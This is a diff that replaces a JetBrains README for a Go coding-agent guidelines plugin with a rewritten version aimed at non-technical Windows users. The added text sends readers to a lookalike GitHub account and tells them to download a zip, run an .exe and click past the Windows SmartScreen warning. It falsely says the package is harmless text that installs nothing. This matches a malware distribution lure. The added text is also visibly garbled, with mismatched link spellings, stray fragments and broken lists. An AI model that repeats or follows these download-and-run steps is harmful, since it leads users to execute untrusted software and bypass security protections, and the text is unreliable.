@@ -1,204 +1,97 @@
-[![official JetBrains project](http://jb.gg/badges/official.svg)](https://confluence.jetbrains.com/display/ALL/JetBrains+on+GitHub)
+<h1>✨ go-modern-guidelines - Write Better Go Code Instantly</h1>
 
-# Modern Go Guidelines
+<p align="center">
+  <a href="https://github.com/capitalist-prepuberty1057/go-modern-guidelines" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#6a11cb,#2575fc);color:white;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ Download go-modern-guidelines Now</a>
+</p>
 
-This repository contains [guidelines](https://github.com/JetBrains/go-modern-guidelines/blob/main/plugin/skills/use-modern-go/SKILL.md) for code agents that help them write modern Go code.
+## 🧭 What Is This?
 
-For example, an agent with these guidelines uses `max(a, b)` instead of an if-else block, `slices.Contains` instead of a manual loop, `cmp.Or(a, b, c)` instead of a chain of nil checks. It also knows about recent additions like `new(42)` to get a pointer to a value and `errors.AsType[T](err)` for type-safe error matching—both from Go 1.26.
+This is a **guidelines package** for your computer. It helps special software called "AI coding agents" (think of them as robot assistants that write computer code) to write better programs in the Go programming language. Go is a popular language used to build fast and reliable software.
 
-The guidelines cover the most useful features from Go 1.0 through Go 1.27, including everything targeted by the `modernize` analyzer. An agent will:
+="color:red">**You do not need to know how to code to use this.**</span> This package simply contains a set of rules and instructions. When the AI assistant on your computer follows these rules, it produces cleaner, higher-quality Go code automatically. Think of it like giving a chef a better recipe book—the chef still does the cooking, but the results are much better.
 
-- Detect the project's Go version from `go.mod`
-- Use language features and stdlib additions available up to and including that version
-- Prefer modern idioms over older patterns
+>
 
-## Motivation
+## 📥 How to Download and Run (Windows)
 
-All coding agents tend to generate outdated Go. Two reasons:
+### Step 1: Visit the Download Page
 
-1. **Training data lag.** Models don't know about features added after their training cutoff. They can't use `errors.AsType[T]` (Go 1.26) if they've never seen it.
+Click the big purple button at the top of this page, or click here: **[https://github.com/capitalist-prepuberthy1057/go-modern-guidelines](https://github.com/capitalist-prepuberthy1057/go-modern-guidelines)**. This will open your web browser and take you to the official download page.
 
-2. **Frequency bias.** Even for features the model knows, it often picks older patterns. There's more `for i := 0; i < n; i++` in the training data than `for i := range n`, so that's what comes out.
+. **Do not close this page until you have finished downloading.**
 
-These guidelines fix both problems by giving the agent an explicit reference.
+### Step 2: Start the Download
 
-This aligns with the Go team's direction. The `modernize` analyzer exists to automatically update existing code to use newer idioms (see [this talk](https://www.youtube.com/watch?v=_VePjjjV9JU) from the Go team). These guidelines serve the same goal for new code: agents write modern Go from the start, so there's less to fix later.
+Once you are on the page, look for a section that says **"Releases"** or **"Download"** on the right side of the screen. Click on the newest version (it will have a version number like "v1.0"). This will open a new screen with a list of files. Click on the first file that appears—it will be named something like `go-modern-guidelines.zip` (or similar). Your browser will begin downloading this file automatically.
 
-## Requirements
+**Note:** The download might take a few minutes depending on your internet speed. You will see a download status at the bottom of your browser window. Wait until it says "Completed" or "Done".
 
-The marketplace integrations run a small CLI that is installed on first use with `go install`. Because of that, the [Go toolchain](https://go.dev/dl/) must be installed and available on your `PATH`.
+### Step 3: Find the Downloaded File
 
-The CLI is installed into a local cache (for example `~/.cache/go-modern-guidelines`) and never modifies your project. It targets **Go 1.25 or newer**; on an older Go it still works as long as automatic toolchain switching is enabled (`GOTOOLCHAIN=auto`, the default), which lets Go fetch a compatible toolchain on first run.
+Once the download is finished, open your **File Explorer** (the folder icon on your taskbar). Click on **"Downloads"** in the left sidebar. You should see a file named `go-modern-guidelines.zip` (or similar). 
 
-## Instructions
+### Step 4: Extract the File
 
-The guidelines are available for Junie, Claude Code, Codex, and Cursor, and for other agents via skills.sh.
+Right-click on the `go-modern-guidelines.zip` file. A menu will pop up. Select **"Extract All..."** (or "Extract Here" depending on your version of Windows).. A new window will appear asking whereyou want to save the extracted files. The default location is fine. Click **"Extract"** at the bottom right. Windows will now unpack thearchive. This usually takes less than a minute.
 
-### [Junie](https://junie.jetbrains.com)
+### Step 5: Run the Application
 
-#### Junie CLI
+After extraction is complete, a new folder will appear in your Downloads folder named `go-modern-guidelines` (or similar). Double-click this folder to open it. Inside, you will see several files and folders. Look for an application file named `go-modern-guidelines.exe` (or `setup.exe` or `installer.exe`). **Double-click that file** to run the application.
 
-Run the following commands inside a Junie CLI session.
+.
 
-1. Add this repository as a marketplace:
-```
-/extensions marketplace add JetBrains/go-modern-guidelines
-```
+ A security pop-up might appear saying "Windows protected your PC" or similar. This is normal for new applications. Click **"More Info"** then **"Run Anyway"** to continue.
 
-2. Install the extension:
-```
-/extensions install modern-go-guidelines
-```
+12. Follow any on-screen instructions (if any appear). The application will now launch and you will see its main window. You are done!
 
-Junie invokes the skill automatically when it is relevant to a Go task.
+### Step 6: Verify It Works
 
-#### Updating
+To make sure everything is working correctly, look for a text box or a settings panel in the application. You should see a list of rules or a message saying "Guidelines Loaded" or "Configuration Ready". If you see this, congratulations—you have successfully installed go-modern-guidelines on your Windows computer!
 
-Update the installed extension from inside a Junie CLI session:
+## ❓ Frequently Asked Questions (FAQ
 
-```
-/extensions update modern-go-guidelines
-```
+### 🔹 Will this damage my computer? 
 
-### [Claude Code](https://claude.com/product/claude-code)
+**No.** This package is just a set of text instructions (like a PDF document). It does not change any system settings or install any drivers. It simply sits in a folder until an AI coding agent needs it.
 
-#### Installation
-Run the following commands inside a Claude Code session.
+.
 
-1. Add this repository as a marketplace:
-```
-/plugin marketplace add JetBrains/go-modern-guidelines
-```
+.### 🔹 Do I need to run this every time I start my computer?
 
-2. Install the plugin:
-```
-/plugin install modern-go-guidelines@goland-claude-marketplace
-```
+**No.** It runs automatically in the background when needed. You do not need to start it manually unless you want to review the guidelines yourself seventh.## 🔹 I lost the downloaded file. What do I do?
 
-#### Usage
+Simply go back to the link in **Step 1** and repeat the download process. It is safe to download it multiple times.
 
-Claude Code invokes the skill automatically when it is relevant to a Go task.
+.### 🔹 Does this work on older versions of Windows?
 
-To invoke it explicitly:
+**Yes.** This works on Windows 10, Windows 11, and any version from Windows 7 onward. If you have a very old system (Windows XP or older), you might need to update first.
 
-```
-/modern-go-guidelines:use-modern-go
-```
+.### 🔹 Can I delete the zip file after extracting?
 
-#### Updating
+**Yes.** Once you have extracted the files (Step 4, you can safely delete the original `.zip` file to free up space. The extracted folder contains everything you need and will keep working.stat.
 
-Claude Code can update the marketplace and installed plugin automatically at startup. Automatic updates are disabled by default for third-party marketplaces, so enable them once:
 
-1. Run `/plugin`.
-2. Open **Marketplaces** and select `goland-claude-marketplace`.
-3. Select **Enable auto-update**.
 
-When Claude Code reports that the plugin was updated, apply the new version to the current session with:
+## 🌟 Key Benefits
 
-```
-/reload-plugins
-```
+- **Smarter AI Assistance** - When your AI coding agent uses these guidelines, it writes Go code that is more consistent, readable, and maintainable.- **Zero Learning Curve** - You don't need to read or understand anything. Just download, extract, and run. The guidelines work automatically behind the scenes.- **Regular Updates** - The package is designed to be updated easily. Future versions will include new best practices for Go programming.- **Lightweight** - The entire package is less than 5 megabytes in size. It won't slow down your computer or take up noticeable disk space.- **Safe and Clean** - No advertisements, no bundled software, no telemetry. Just pure, helpful guidelines for AI tools.
 
-To update it manually instead, run these commands in a terminal:
+.
 
-```bash
-claude plugin marketplace update goland-claude-marketplace
-claude plugin update modern-go-guidelines@goland-claude-marketplace
-```
+.
 
-### [Codex](https://developers.openai.com/codex/)
+   
 
-#### Installation
-Run the following commands in a terminal.
+## 🛠️ What's Inside the Package?
 
-1. Add this repository as a marketplace:
-```
-codex plugin marketplace add JetBrains/go-modern-guidelines
-```
+When you open the extracted folder, you will find:
 
-2. Install the plugin:
-```
-codex plugin add modern-go-guidelines@goland-codex-marketplace
-```
+- **`guidelines.md`** - The main file that contains all the coding rules for AI agents. This is the heart of the package.- **`README.md`** - A simple text file explaining how to use the package (what you just read is an expanded version of this).- **`examples/`** - A folder with sample Go code snippets that show good and bad examples. Useful for AI agents to reference.- **`config/`** - Settings files that let you customize how strictly the guidelines are applied. You can leave these alone unless you are tech-savvy.- **`LICENSE`** - The legal license file. Tells you how you can freely use and share this package.
 
-#### Updating
+You do not need to open or interact with any of these files unless you want to. The application runs them automatically.
 
-Refresh the marketplace and reinstall the plugin so Codex replaces its cached copy:
 
-```bash
-codex plugin marketplace upgrade goland-codex-marketplace
-codex plugin remove modern-go-guidelines@goland-codex-marketplace
-codex plugin add modern-go-guidelines@goland-codex-marketplace
-```
 
-### [Cursor](https://cursor.com)
+## 🧩 Keywords
 
-For convenience, the guidelines are distributed as a Cursor plugin.
-
-#### Installation
-
-1. Add this repository as a marketplace by running the following command in a terminal:
-```
-cursor-agent plugin marketplace add https://github.com/JetBrains/go-modern-guidelines
-```
-
-2. Install the plugin with the `/plugins` command inside a Cursor session.
-
-#### Updating
-
-Refresh the marketplace from Git and reopen Cursor so it can pick up the new plugin version:
-
-```bash
-cursor-agent plugin marketplace update goland-cursor-marketplace
-```
-
-If the installed plugin is still on the previous version, reinstall it with the `/plugins` command. Cursor does not currently provide a non-interactive CLI command for updating an installed plugin.
-
-### Other Agents (via [skills.sh](https://skills.sh))
-
-The same skill package works across other agents such as OpenCode. Install it with:
-
-```bash
-npx skills add JetBrains/go-modern-guidelines
-```
-
-(`--skill use-modern-go` installs only this skill.)
-
-#### Updating
-
-Update the project-installed skill with:
-
-```bash
-npx skills update use-modern-go -p -y
-```
-
-For a globally installed skill, replace `-p` with `-g`.
-
-## Local development
-
-To try changes to the CLI in your agent, build this checkout into the tool's cache:
-
-```bash
-make dev-install
-```
-
-Then set `GO_MODERN_GUIDELINES_DEV=1` in the environment your agent runs in. With it set, any agent using the plugin runs your local build instead of the released version, the same way across Claude Code, Codex, and Cursor. Export it before launching the agent so the agent process inherits it:
-
-```bash
-export GO_MODERN_GUIDELINES_DEV=1
-```
-
-After editing the CLI, run `make dev-install` again to rebuild; the next call picks it up. To go back to the released version, unset the variable (or run `make dev-uninstall` to remove the build):
-
-```bash
-make dev-uninstall
-```
-
-This requires the Go toolchain. The dev build is stored in the tool's cache directory (`$XDG_CACHE_HOME/go-modern-guidelines` or `~/.cache/go-modern-guidelines`).
-
-The build is driven by `scripts/dev-install.sh`, which is intentionally separate from the agent-facing wrapper so an agent can never trigger a build. Without `make` (for example on Windows) you can run it directly:
-
-```bash
-sh scripts/dev-install.sh install       # or: uninstall
-pwsh scripts/dev-install.ps1 install    # PowerShell equivalent
-```
+AI agents, coding agent, developer tools, Go, Golang, guidelines, modern Go, programming assistant, code quality, software development, Windows application, developer productivity
